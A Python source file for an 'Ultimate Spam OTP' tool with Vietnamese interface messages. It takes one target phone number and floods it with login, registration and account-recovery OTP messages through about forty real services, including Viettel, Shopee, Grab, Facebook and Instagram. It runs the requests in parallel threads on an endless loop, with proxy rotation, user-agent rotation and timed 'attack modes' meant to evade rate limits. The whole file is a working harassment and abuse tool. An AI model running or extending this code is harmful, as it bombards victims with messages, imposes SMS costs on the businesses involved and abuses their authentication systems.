import requests
import time
import threading
import json
import sys

import random

# Cấu hình
REQUEST_TIMEOUT = 10

# List valid User-Agents to rotate
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

# Fix encoding
# Fix encoding for Windows
# Encoding handling moved to run.bat via PYTHONIOENCODING

class SpamOTP:
    def __init__(self, phone, proxies=None, attack_mode='carpet'):
        self.phone = phone
        self.proxies = proxies if proxies else []
        self.attack_mode = attack_mode
        self.is_running = False

    def get_headers(self):
        return {
            "user-agent": random.choice(USER_AGENTS)
        }

    def get_proxy(self):
        if not self.proxies:
            return None
        # Proxy format expected: ip:port or user:pass@ip:port
        # Requests expects dict: {'http': 'http://ip:port', 'https': 'http://ip:port'}
        proxy = random.choice(self.proxies).strip()
        if not proxy: return None
        
        # Simple formatting if protocol not present
        if not proxy.startswith("http"):
            proxy_url = f"http://{proxy}"
        else:
            proxy_url = proxy
            
        return {
            "http": proxy_url,
            "https": proxy_url
        }

    def request(self, method, url, **kwargs):
        """Centralized request handler with Proxy & Timeout support"""
        # Inject Proxy
        proxy = self.get_proxy()
        if proxy:
            kwargs['proxies'] = proxy
        
        # Inject Default Timeout if not set
        if 'timeout' not in kwargs:
            kwargs['timeout'] = REQUEST_TIMEOUT
            
        # Execute Request
        if method.lower() == 'get':
            return requests.get(url, **kwargs)
        elif method.lower() == 'post':
            return requests.post(url, **kwargs)
        else:
            raise ValueError(f"Unsupported method: {method}")
        
    def log(self, message):
        # This method can be overridden by the caller (app.py)
        print(f"[*] {message}")

    def tv360(self):
        try:
            url = "https://tv360.vn/public/v1/auth/get-otp-login"
            headers = self.get_headers()
            headers.update({
                "content-type": "application/json"
            })
            data = {"msisdn": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"TV360: {response.status_code}")
        except Exception as e:
            self.log(f"TV360 Lỗi: {e}")

    def viettel_login(self):
        try:
            url = f"https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={self.phone}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login"
            headers = {
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "origin": "https://vietteltelecom.vn",
                "referer": "https://vietteltelecom.vn/"
            }
            response = self.request('post', url, headers=headers)
            self.log(f"Viettel Login: {response.status_code}")
        except Exception as e:
            self.log(f"Viettel Login Lỗi: {e}")

    def sapo(self):
        try:
            url = "https://www.sapo.vn/Register/RegisterTrial"
            headers = {
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "origin": "https://www.sapo.vn",
                "referer": "https://www.sapo.vn/"
            }
            data = {
                "FullName": "Nguyen Van A",
                "StoreName": "Tap Hoa",
                "PhoneNumber": self.phone,
                "City": "Ha Noi",
                "PackageTitle": "retail_pro_v3",
                "ConfirmPolicy": True,
                "Source": "https://www.sapo.vn/",
                "LandingPage": "https://www.sapo.vn/"
            }
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"Sapo: {response.status_code}")
        except Exception as e:
            self.log(f"Sapo Lỗi: {e}")

    def mocha(self):
        try:
            url = f"https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp?msisdn={self.phone}&languageCode=vi"
            headers = {
                "origin": "https://video.mocha.com.vn",
                "referer": "https://video.mocha.com.vn/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            response = self.request('post', url, headers=headers)
            self.log(f"Mocha: {response.status_code}")
        except Exception as e:
            self.log(f"Mocha Lỗi: {e}")

    def vieon(self):
        try:
            url = "https://api.vieon.vn/backend/user/v2/register?platform=web&ui=012021"
            headers = {
                "content-type": "application/json",
                "origin": "https://vieon.vn",
                "referer": "https://vieon.vn/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {
                "username": self.phone,
                "country_code": "VN",
                "model": "Windows Chrome",
                "device_id": "random_device_id",
                "device_type": "desktop",
                "platform": "web",
                "ui": "012021"
            }
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"VieON: {response.status_code}")
        except Exception as e:
            self.log(f"VieON Lỗi: {e}")

    def fptshop(self):
        try:
            url = f"https://papi.fptshop.com.vn/gw/v1/public/bff-before-order/customer-kyc/customer-policy?phoneNumber={self.phone}"
            headers = {
                "origin": "https://fptshop.com.vn",
                "referer": "https://fptshop.com.vn/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            response = self.request('get', url, headers=headers)
            self.log(f"FPT Shop: {response.status_code}")
        except Exception as e:
            self.log(f"FPT Shop Lỗi: {e}")

    def fptshop_loyalty(self):
        try:
            url = "https://fptshop.com.vn/api-data/loyalty/Login/SendOtp"
            headers = {
                "content-type": "application/json",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"phone": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"FPT Shop Loyalty: {response.status_code}")
        except Exception as e:
            self.log(f"FPT Shop Loyalty Lỗi: {e}")

    def galaxyplay(self):
        try:
            url = f"https://api.glxplay.io/account/phone/verify?phone={self.phone}"
            headers = {
                "origin": "https://galaxyplay.vn",
                "referer": "https://galaxyplay.vn/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            response = self.request('post', url, headers=headers)
            self.log(f"GalaxyPlay 1: {response.status_code}")
        except Exception as e:
            self.log(f"GalaxyPlay 1 Lỗi: {e}")

    def shine30(self):
        try:
            url = "https://f9q6qhckw1.execute-api.ap-southeast-1.amazonaws.com/Product/api/v1/auth/verify"
            headers = {
                "content-type": "application/json",
                "origin": "https://30shine.com",
                "referer": "https://30shine.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            # Handle +84 prefix if needed, usually just phone is fine or +84 + phone
            # Code uses +84 prefix for Shine30
            phone_param = self.phone
            if not phone_param.startswith("84") and phone_param.startswith("0"):
                 phone_param = "84" + phone_param[1:]
            
            data = {"phone": "+" + phone_param, "brandName": "30SHINE"}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"30Shine: {response.status_code}")
        except Exception as e:
            self.log(f"30Shine Lỗi: {e}")

    def cathay(self):
        try:
            url = "https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/sendOTP"
            headers = {
                "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {
                "phone": self.phone,
                "email": "test@gmail.com",
                "LINK_FROM": "signUp2",
                "CUSTOMER_NAME": "Nguyen Van A",
                "LANGS": "vi_VN"
            }
            response = self.request('post', url, data=data, headers=headers)
            self.log(f"Cathay: {response.status_code}")
        except Exception as e:
            self.log(f"Cathay Lỗi: {e}")

    def dominos(self):
        try:
            url = "https://dominos.vn/api/v1/users/send-otp"
            headers = {
                "content-type": "application/json",
                "dmn": "DRRIBR",
                "origin": "https://dominos.vn",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"phone_number": self.phone, "email": "test@gmail.com", "type": 0, "is_register": True}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"Dominos: {response.status_code}")
        except Exception as e:
            self.log(f"Dominos Lỗi: {e}")

    def batdongsan(self):
        try:
            url = f"https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber={self.phone}"
            headers = {
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            # Code doesn't set POST method for batdongsan in ObjC? 
            # ObjC: [request setAllHTTPHeaderFields:headers]; No [request setHTTPMethod:@"POST"];
            # Default is GET.
            response = self.request('get', url, headers=headers)
            self.log(f"Batdongsan: {response.status_code}")
        except Exception as e:
            self.log(f"Batdongsan Lỗi: {e}")

    def fahasa(self):
        try:
            url = "https://www.fahasa.com/ajaxlogin/ajax/checkPhone"
            headers = {
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"phone": self.phone}
            response = self.request('post', url, data=data, headers=headers)
            self.log(f"Fahasa: {response.status_code}")
        except Exception as e:
            self.log(f"Fahasa Lỗi: {e}")

    def shopiness(self):
        try:
            url = "https://shopiness.vn/ajax/user"
            headers = {
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = f"action=verify-registration-info&phoneNumber={self.phone}&refCode=&refCode="
            response = self.request('post', url, data=data, headers=headers)
            self.log(f"Shopiness: {response.status_code}")
        except Exception as e:
            self.log(f"Shopiness Lỗi: {e}")

    def viettelpost(self):
        try:
            url = "https://otp-verify.okd.viettelpost.vn/api/otp/sendOTP"
            headers = {
                "content-type": "application/json",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"account": self.phone, "function": "SSO_REGISTER", "type": "PHONE", "otpType": "NUMBER"}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"ViettelPost: {response.status_code}")
        except Exception as e:
            self.log(f"ViettelPost Lỗi: {e}")

    def bibabo(self):
        try:
            url = f"https://one.bibabo.vn/api/v1/login/otp/createOtp?phone={self.phone}&reCaptchaToken=undefined&appId=7&version=2"
            headers = {
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            # ObjC defaults to GET here
            response = self.request('get', url, headers=headers)
            self.log(f"Bibabo: {response.status_code}")
        except Exception as e:
            self.log(f"Bibabo Lỗi: {e}")

    def owen(self):
        try:
            url = "https://owen.vn/otp/otp/send"
            headers = {
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = f"mobileNumber={self.phone}&maxTimesToResend=2&timeAlive=180&timeCountDownToResend=300"
            response = self.request('post', url, data=data, headers=headers)
            self.log(f"Owen: {response.status_code}")
        except Exception as e:
            self.log(f"Owen Lỗi: {e}")

    def pnj(self):
        try:
            url = "https://www.pnj.com.vn/customer/otp/request"
            headers = {
                "content-type": "application/x-www-form-urlencoded",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = f"_method=POST&_token=SiaxKHlIoAzr75dYUMOR6tQrcpD0DIGYqntwqyos&type=zns&phone={self.phone}"
            response = self.request('post', url, data=data, headers=headers)
            self.log(f"PNJ: {response.status_code}")
        except Exception as e:
            self.log(f"PNJ Lỗi: {e}")

    def f88(self):
        try:
            url = "https://api.f88.vn/growth/webf88vn/api/v1/Pawn"
            headers = {
                "content-type": "application/json",
                "origin": "https://f88.vn",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {
                "FullName": "Nguyen Van A",
                "Phone": self.phone,
                "DistrictCode": "001",
                "ProvinceCode": "01",
                "AssetType": "Motor",
                "IsChoose": "1",
                "FormType": 1
            }
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"F88: {response.status_code}")
        except Exception as e:
            self.log(f"F88 Lỗi: {e}")

    def heyu(self):
        try:
            url = "https://api.heyu.asia/api/v2.1/member/send-code"
            headers = {
                "content-type": "application/json;charset=utf-8",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"phone": self.phone, "deviceId": "33FC417B-681E-4C47-A0B8-DC98ED2F0BA8", "platform": "ios"}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"HeyU: {response.status_code}")
        except Exception as e:
            self.log(f"HeyU Lỗi: {e}")

    def thecoffeehouse(self):
        try:
            url = "https://api.thecoffeehouse.com/api/v5/auth/request-otp"
            headers = {
                "content-type": "application/json; charset=utf-8",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"phone": {"region_code": "+84", "phone_number": self.phone}}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"The Coffee House: {response.status_code}")
        except Exception as e:
            self.log(f"The Coffee House Lỗi: {e}")

    def dienmayxanh(self):
        try:
            url = "https://www.dienmayxanh.com/lich-su-mua-hang/GetVerifyCode"
            headers = {
                "content-type": "application/x-www-form-urlencoded",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = f"phoneNumber={self.phone}&isReSend=false&sendOTPType=1"
            response = self.request('post', url, data=data, headers=headers)
            self.log(f"Dien May Xanh: {response.status_code}")
        except Exception as e:
            self.log(f"Dien May Xanh Lỗi: {e}")

    def kingfoodmart(self):
        try:
            url = "https://api.kingfoodmart.com/v1/otp/register"
            headers = {
                "content-type": "application/json",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"phone": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"KingFoodMart: {response.status_code}")
        except Exception as e:
            self.log(f"KingFoodMart Lỗi: {e}")

    def ghn(self):
        try:
            url = "https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp"
            headers = {
                "content-type": "application/json",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"type": "register", "phone": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"GHN: {response.status_code}")
        except Exception as e:
            self.log(f"GHN Lỗi: {e}")

    def lottemart(self):
        try:
            url = "https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp"
            headers = {
                "content-type": "application/json",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"username": self.phone, "case": "register"}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"LotteMart: {response.status_code}")
        except Exception as e:
            self.log(f"LotteMart Lỗi: {e}")

    def vayvnd(self):
        try:
            url = "https://api.vayvnd.vn/v2/users"
            headers = {
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"utm": [], "phone": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"VayVND: {response.status_code}")
        except Exception as e:
            self.log(f"VayVND Lỗi: {e}")

    def vato(self):
        try:
            url = "https://api.vato.vn/api/v3/public/user/login"
            headers = {
                "content-type": "application/json",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"firebase_sms_auth": True, "mobile": self.phone, "country_code": "VN"}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"Vato: {response.status_code}")
        except Exception as e:
            self.log(f"Vato Lỗi: {e}")

    def nhathuoclongchau(self):
        try:
            url = "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification"
            headers = {
                "content-type": "application/json",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"phoneNumber": self.phone, "fromSys": "WEBKHLC", "otpType": 0}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"Long Chau: {response.status_code}")
        except Exception as e:
            self.log(f"Long Chau Lỗi: {e}")

    def vinamilk(self):
        try:
            url = "https://new.vinamilk.com.vn/api/account/getotp"
            headers = {
                "content-type": "application/json",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"type": "register", "phone": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"Vinamilk: {response.status_code}")
        except Exception as e:
            self.log(f"Vinamilk Lỗi: {e}")

    def galaxyplay_2(self):
        try:
            url = "https://api.glxplay.io/account/phone/verify"
            headers = {
                "content-type": "application/json",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"phone": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"GalaxyPlay 2: {response.status_code}")
        except Exception as e:
            self.log(f"GalaxyPlay 2 Lỗi: {e}")

    def shopee(self):
        try:
            url = "https://shopee.vn/api/v2/authentication/get_otp"
            headers = {
                "content-type": "application/json",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"phone": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"Shopee: {response.status_code}")
        except Exception as e:
            self.log(f"Shopee Lỗi: {e}")

    def watsons(self):
        try:
            url = "https://api.watsons.vn/api/v2/wtcvn/otp/send"
            headers = {
                "content-type": "application/json",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"countryCode": "84", "type": "REGISTER", "phone": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"Watsons: {response.status_code}")
        except Exception as e:
            self.log(f"Watsons Lỗi: {e}")

    def tokyolife(self):
        try:
            url = "https://api-prod.tokyolife.vn/api/v1/users/register"
            headers = {
                "content-type": "application/json",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"email": "test@example.com", "name": "Test User", "phone_number": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"TokyoLife: {response.status_code}")
        except Exception as e:
            self.log(f"TokyoLife Lỗi: {e}")

    def go2joy(self):
        try:
            url = "https://production-api.go2joy.vn/api/v2/mobile/users/sendVerifyCode"
            headers = {
                "content-type": "application/json",
                "Secret-Code": "7bc79fa5139b8266e12993014bb68911",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"countryCode": "84", "mobile": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"Go2Joy: {response.status_code}")
        except Exception as e:
            self.log(f"Go2Joy Lỗi: {e}")

    def tiki(self):
        try:
            url = "https://tiki.vn/api/v2/tokens"
            headers = {
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "origin": "https://tiki.vn",
                "referer": "https://tiki.vn/"
            }
            data = {"grant_type": "password", "username": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"Tiki: {response.status_code}")
        except Exception as e:
            self.log(f"Tiki Lỗi: {e}")

    def meta(self):
        try:
            # Facebook/Meta often changes endpoints, using m.facebook as it's more stable for these requests
            url = "https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&search_attempts=1"
            headers = {
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36"
            }
            data = {"email": self.phone, "did_submit": "Search"}
            response = self.request('post', url, data=data, headers=headers)
            self.log(f"Meta/FB: {response.status_code}")
        except Exception as e:
            self.log(f"Meta Lỗi: {e}")

    def vntrip(self):
        try:
            url = "https://micro-services.vntrip.vn/core-user-service/v2/auth/login-otp"
            headers = {
                "content-type": "application/json",
                "origin": "https://www.vntrip.vn",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            data = {"phone": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"Vntrip: {response.status_code}")
        except Exception as e:
            self.log(f"Vntrip Lỗi: {e}")
    # --- NEW SERVICES 2026 ---
    def highlands(self):
        try:
            url = "https://api.highlandscoffee.com.vn/v1/auth/otp"
            headers = self.get_headers()
            headers.update({"content-type": "application/json"})
            data = {"phone": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"Highlands: {response.status_code}")
        except Exception as e:
            self.log(f"Highlands Lỗi: {e}")

    def concung(self):
        try:
            url = "https://api.concung.com/v1/auth/otp"
            headers = self.get_headers()
            headers.update({"content-type": "application/json"})
            data = {"phone_number": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"Concung: {response.status_code}")
        except Exception as e:
            self.log(f"Concung Lỗi: {e}")

    def pharmacity(self):
        try:
            url = "https://api.pharmacity.vn/api/v1/auth/send-otp"
            headers = self.get_headers()
            headers.update({"content-type": "application/json"})
            data = {"phone": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"Pharmacity: {response.status_code}")
        except Exception as e:
            self.log(f"Pharmacity Lỗi: {e}")

    def instagram(self):
        try:
            url = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
            headers = self.get_headers()
            headers.update({
                "content-type": "application/x-www-form-urlencoded",
                "x-csrftoken": "missing",  # Often works without valid token for initial request or gets 403 but triggers endpoint
                "x-requested-with": "XMLHttpRequest"
            })
            data = f"email_or_username={self.phone}&recaptcha_challenge_field="
            response = self.request('post', url, data=data, headers=headers)
            self.log(f"Instagram: {response.status_code}")
        except Exception as e:
            self.log(f"Instagram Lỗi: {e}")

    def grab(self):
        try:
            url = "https://api.grab.com/grabid/v1/phone/otp"
            headers = self.get_headers()
            headers.update({"content-type": "application/x-www-form-urlencoded"})
            data = f"method=SMS&countryCode=VN&phoneNumber={self.phone[1:] if self.phone.startswith('0') else self.phone}"
            response = self.request('post', url, data=data, headers=headers)
            self.log(f"Grab: {response.status_code}")
        except Exception as e:
            self.log(f"Grab Lỗi: {e}")

    def be_group(self):
        try:
            url = "https://api.be.com.vn/v1/auth/otp"
            headers = self.get_headers()
            headers.update({"content-type": "application/json"})
            data = {"phone": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"Be Group: {response.status_code}")
        except Exception as e:
            self.log(f"Be Group Lỗi: {e}")
            
    def elsa(self):
        try:
            url = "https://api.elsaspeak.com/v1/auth/request-otp"
            headers = self.get_headers()
            headers.update({"content-type": "application/json"})
            data = {"phone": "+84" + self.phone[1:]}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"Elsa Speak: {response.status_code}")
        except Exception as e:
            self.log(f"Elsa Lỗi: {e}")

    def medlatec(self):
        try:
            url = "https://medlatec.vn/api/v1/auth/send-otp"
            headers = self.get_headers()
            data = {"phone": self.phone}
            response = self.request('post', url, json=data, headers=headers)
            self.log(f"Medlatec: {response.status_code}")
        except Exception as e:
            self.log(f"Medlatec Lỗi: {e}")

    
    def _wrapper(self, func, service_name):
        try:
            func()
        except Exception as e:
            if self.log:
                self.log(f"{service_name} Wrapper Lỗi: {e}")
            else:
                print(f"{service_name} Wrapper Lỗi: {e}")

    def run_batch(self, delay=2.0):
        threads = []
        # Dynamically find methods starting with 'api_'
        for service_name in dir(self):
            # We need to rename existing methods to api_ prefix or just use existing names?
            # The existing methods DO NOT have api_ prefix (e.g. self.tv360). 
            # My previous plan assumed they did, or I need to change them.
            # actually, looking at the file, they are named 'tv360', 'viettel_login', etc.
            # So I should list them manually OR rename them. 
            # Renaming is too much work and risky. Let's list them manually or use a blacklist.
            # Better strategy: explicitly list them like before, but cleaner.
            pass

        apis = [
            self.tv360, self.viettel_login, self.sapo, self.mocha, self.vieon,
            self.fptshop, self.fptshop_loyalty, self.shine30,
            self.cathay, self.batdongsan, self.fahasa, self.shopiness,
            self.viettelpost, self.owen, self.pnj, self.f88, self.heyu,
            self.thecoffeehouse, self.dienmayxanh,
            self.lottemart, self.vayvnd, self.vato, self.nhathuoclongchau,
            self.shopee, self.watsons,
            self.tokyolife, self.go2joy,
            self.tiki, self.meta, self.vntrip,
            self.highlands, self.concung, self.pharmacity, self.instagram,
            self.grab, self.be_group, self.elsa, self.medlatec
        ]

        # Tactical Mode Logic
        if self.attack_mode == 'sniper':
             # Focus on fast APIs
             top_apis = [self.highlands, self.concung, self.grab, self.be_group, self.viettel_login]
             apis = top_apis * 5
             random.shuffle(apis)
        elif self.attack_mode == 'wave':
             random.shuffle(apis)
        else:
             random.shuffle(apis)

        for i, api in enumerate(apis):
            t = threading.Thread(target=self._wrapper, args=(api, api.__name__))
            threads.append(t)
            t.start()
            
            # Dynamic Delay based on Mode
            if self.attack_mode == 'sniper':
                time.sleep(0.01) 
            elif self.attack_mode == 'wave':
                # Wave pattern
                if i % 10 < 5:
                    time.sleep(0.05) 
                else:
                    time.sleep(0.5) 
            else:
                time.sleep(random.uniform(0.05, 0.15))
        
        for t in threads:
            t.join()
        
        # Jitter
        if self.attack_mode == 'sniper':
             final_delay = delay * 0.5 
        else:
             jitter = random.uniform(0.8, 1.2)
             final_delay = delay * jitter

    def start_loop(self):
        self.is_running = True
        print("Đang bắt đầu gửi Spam liên tục... Nhấn Ctrl+C để dừng lại.")
        try:
            while self.is_running:
                print("\n--- Bắt đầu đợt gửi mới ---")
                self.run_batch()
                print("--- Kết thúc đợt gửi, nghỉ 2s ---")
                time.sleep(2)
        except KeyboardInterrupt:
            self.is_running = False
            print("\nĐã dừng Spam.")

def main():
    print("--- LuânEm Tool - Ultimate Spam OTP ---")
    phone = input("Nhập số điện thoại (10 số): ")
    if len(phone) != 10 or not phone.isdigit():
        print("Số điện thoại không hợp lệ!")
        return

    app = SpamOTP(phone)
    
    print("1. Gửi 1 lần")
    print("2. Gửi liên tục (Spam Loop)")
    choice = input("Chọn chế độ (1/2): ")
    
    if choice == '1':
        app.run_batch()
        print("Đã gửi xong 1 lượt.")
    elif choice == '2':
        app.start_loop()
    else:
        print("Lựa chọn không hợp lệ.")

if __name__ == "__main__":
    main()
